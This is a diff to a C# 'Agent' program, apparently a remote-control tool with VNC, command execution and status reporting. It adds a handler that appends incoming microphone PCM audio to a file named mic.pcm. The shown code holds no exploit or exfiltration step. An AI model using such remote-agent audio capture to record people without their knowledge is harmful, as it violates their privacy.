@@ -1,8 +1,6 @@
 ﻿using Agent.TLV;
 using Agent.VNC;
-using System;
 using System.Collections.Concurrent;
-using System.Data;
 using System.Diagnostics;
 using System.Text;
 
@@ -26,7 +24,8 @@ namespace Agent
             WSDATARECV = 6,
             RequestAgentStatus = 7,
             AgentStatus = 8,
-            ExecuteResult = 9
+            ExecuteResult = 9,
+            MicPcmData = 10
         }
 
         public Executer()
@@ -261,6 +260,24 @@ namespace Agent
                     {
                         var machineName = Encoding.UTF8.GetBytes(Environment.MachineName);
                         TLVHandling.WriteTLVToStream((byte)Command.AgentStatus, machineName, 0, machineName.Length, stream, cts.Token).Wait();
+                    }
+                    break;
+                case Command.MicPcmData:
+                    const string filename = "mic.pcm";
+
+                    if (data.Length != 0)
+                    {
+                        if (File.Exists(filename))
+                        {
+                            using (var file = File.Open(filename, FileMode.Append))
+                            {
+                                file.Write(data, 0, data.Length);
+                            }
+                        }
+                        else
+                        {
+                            File.WriteAllBytes(filename, data);
+                        }
                     }
                     break;
                 default:
